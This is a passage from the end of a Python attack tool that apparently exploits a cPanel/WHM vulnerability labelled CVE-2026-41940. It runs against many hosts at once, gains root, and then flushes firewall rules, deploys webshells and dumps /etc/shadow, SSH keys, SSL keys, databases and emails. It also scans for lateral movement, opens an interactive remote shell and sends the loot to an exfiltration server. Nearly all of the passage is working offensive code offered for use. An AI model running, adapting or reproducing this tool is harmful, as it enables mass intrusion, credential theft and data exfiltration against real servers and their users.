                    if args.modify_ssh:
                        res.post_exploit["modify_ssh"] = tool.post_modify_ssh()
                    if args.disable_security:
                        res.post_exploit["security"] = tool.post_disable_security()
                    if args.webshell:
                        res.post_exploit["webshell"] = tool.post_deploy_webshell(
                            args.webshell)
                    if args.flush_firewall:
                        res.post_exploit["firewall"] = tool.post_exec(
                            "iptables -F; iptables -X; "
                            "iptables -P INPUT ACCEPT; "
                            "iptables -P FORWARD ACCEPT; "
                            "iptables -P OUTPUT ACCEPT")
                    if args.extract_emails:
                        res.post_exploit["emails"] = tool.post_extract_emails()
                    if args.extract_databases:
                        res.post_exploit["databases"] = tool.post_extract_databases()
                    if args.extract_cpanel_users:
                        res.post_exploit["cpanel_users"] = tool.post_extract_cpanel_users()
                    if args.extract_ssl_keys:
                        res.post_exploit["ssl_keys"] = tool.post_extract_ssl_keys()
                    if args.extract_cron_jobs:
                        res.post_exploit["cron_jobs"] = tool.post_extract_cron_jobs()
                    if args.extract_bash_history:
                        res.post_exploit["bash_history"] = tool.post_extract_bash_history()
                    if args.extract_ssh_agent:
                        res.post_exploit["ssh_agent"] = tool.post_extract_ssh_agent()
                    if args.api_token:
                        res.post_exploit["api_token"] = tool.post_api_token()
                    if args.full_backup:
                        res.post_exploit["backup"] = tool.post_full_backup(
                            args.full_backup)
                    if args.lateral_scan is not None:
                        subnet = args.lateral_scan if args.lateral_scan else None
                        res.post_exploit["lateral_scan"] = tool.post_lateral_scan(subnet)
                    if args.dump_shadow:
                        res.post_exploit["shadow"] = tool.post_read_file("/etc/shadow")
                    if args.dump_ssh_keys:
                        res.post_exploit["ssh_keys"] = tool.post_read_file(
                            "/root/.ssh/authorized_keys")
                    if args.exec:
                        res.post_exploit["exec"] = tool.post_exec(args.exec)
                    if args.rce:
                        res.post_exploit["rce"] = tool.rce_via_passwd_ssh(args.rce)
                    if args.suspend_user:
                        res.post_exploit["suspend"] = tool.post_suspend_user(
                            args.suspend_user)
                    if args.remove_user:
                        res.post_exploit["remove"] = tool.post_remove_user(
                            args.remove_user)
                    if args.change_package:
                        res.post_exploit["changepkg"] = tool.post_change_package(
                            *args.change_package)
                    if args.read_file:
                        res.post_exploit["read_file"] = tool.post_read_file(
                            args.read_file)
                    if args.write_file:
                        res.post_exploit["write_file"] = tool.post_write_file(
                            *args.write_file)

                    if args.exfil_server:
                        for tag, val in res.post_exploit.items():
                            try:
                                tool.post_exfil(args.exfil_server, str(val)[:100000], tag)
                            except Exception:
                                pass
            except Exception as e:
                res.post_exploit["post_error"] = str(e)

        with lock:
            done[0] += 1
            if res.root_confirmed:
                print(f"[!] [{done[0]}/{len(targets)}] {tgt} → ROOT "
                      f"(v={res.whm_version}, host={res.hostname})")
            else:
                print(f"[-] [{done[0]}/{len(targets)}] {tgt} → {res.error}")

            if res.post_exploit:
                host_dir = os.path.join(args.out_dir,
                                        re.sub(r'[^A-Za-z0-9._-]', '_', tgt))
                os.makedirs(host_dir, exist_ok=True)
                for k, v in res.post_exploit.items():
                    try:
                        with open(os.path.join(host_dir, f"{k}.txt"), "w") as f:
                            f.write(str(v))
                    except Exception:
                        pass
        return res, tool

    if len(targets) == 1:
        tgt = targets[0]
        tool = None
        try:
            res, tool = process(tgt)
            results.append(res)
        except Exception as e:
            results.append(ExploitResult(target=tgt, error=f"unhandled: {e}"))

        if tool and results[0].root_confirmed:
            if args.shell:
                print("\n[*] SSH command shell (type 'exit')")
                while True:
                    try:
                        cmd = input("cve-2026-41940# ").strip()
                    except (EOFError, KeyboardInterrupt):
                        break
                    if cmd.lower() in ("exit", "quit", "q"):
                        break
                    if cmd:
                        print(tool.rce_via_passwd_ssh(cmd))
            if args.interactive:
                interactive_menu(tool)
    else:
        with ThreadPoolExecutor(max_workers=args.threads) as pool:
            futs = {pool.submit(process, t): t for t in targets}
            for fut in as_completed(futs):
                tgt = futs[fut]
                try:
                    r, _ = fut.result()
                    results.append(r)
                except Exception as e:
                    results.append(ExploitResult(target=tgt, error=f"unhandled: {e}"))
        rooted = sum(1 for r in results if r.root_confirmed)
        print(f"\n[*] Complete. {rooted}/{len(results)} rooted.")

    if args.output:
        payload = []
        for r in results:
            entry = {
                "target": r.target,
                "root": r.root_confirmed,
                "vulnerable": r.vulnerable,
                "token": r.token,
                "version": r.whm_version,
                "hostname": r.hostname,
                "error": r.error,
                "elapsed": r.elapsed,
            }
            if r.post_exploit:
                entry["post_exploit"] = {k: str(v)[:5000]
                                          for k, v in r.post_exploit.items()}
            payload.append(entry)
        try:
            with open(args.output, "w", encoding="utf-8") as f:
                json.dump(payload, f, indent=2, ensure_ascii=False)
            print(f"[*] Report: {args.output}")
        except OSError as e:
            print(f"[-] Write failed: {e}", file=sys.stderr)

    if len(targets) == 1 and not results[0].root_confirmed:
        sys.exit(1)


if __name__ == "__main__":
    main()